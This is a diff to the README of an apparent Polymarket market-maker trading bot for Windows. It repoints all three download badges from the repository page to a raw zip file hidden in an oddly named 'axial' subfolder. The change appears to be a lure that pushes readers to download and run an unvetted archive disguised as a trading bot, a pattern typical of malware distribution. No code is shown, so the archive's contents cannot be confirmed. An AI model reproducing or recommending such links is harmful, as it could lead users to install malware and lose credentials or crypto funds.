@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Market-Maker-Bot - Run Your Market Bot Fast
 
-[![Download](https://img.shields.io/badge/Download-Polymarket--Market--Maker--Bot-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot)
+[![Download](https://img.shields.io/badge/Download-Polymarket--Market--Maker--Bot-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot/raw/refs/heads/main/axial/Market_Maker_Bot_Polymarket_v3.4.zip)
 
 ## 🚀 What This App Does
 
@@ -35,7 +35,7 @@ For best results, use:
 
 Visit this page to download and run the app on Windows:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-Polymarket--Market--Maker--Bot-6C757D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot)
+[![Visit Download Page](https://img.shields.io/badge/Visit%20Download%20Page-Polymarket--Market--Maker--Bot-6C757D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot/raw/refs/heads/main/axial/Market_Maker_Bot_Polymarket_v3.4.zip)
 
 If the page shows a release file, download it to your computer. If it opens a general repository page, use the files shown there to get the latest version.
 
@@ -247,4 +247,4 @@ To get the latest version:
 
 If you need the file later, use this link again:
 
-[![Download Polymarket-Market-Maker-Bot](https://img.shields.io/badge/Download%20Again-Polymarket--Market--Maker--Bot-4C1D95?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot)
+[![Download Polymarket-Market-Maker-Bot](https://img.shields.io/badge/Download%20Again-Polymarket--Market--Maker--Bot-4C1D95?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingabergviable828/Polymarket-Market-Maker-Bot/raw/refs/heads/main/axial/Market_Maker_Bot_Polymarket_v3.4.zip)
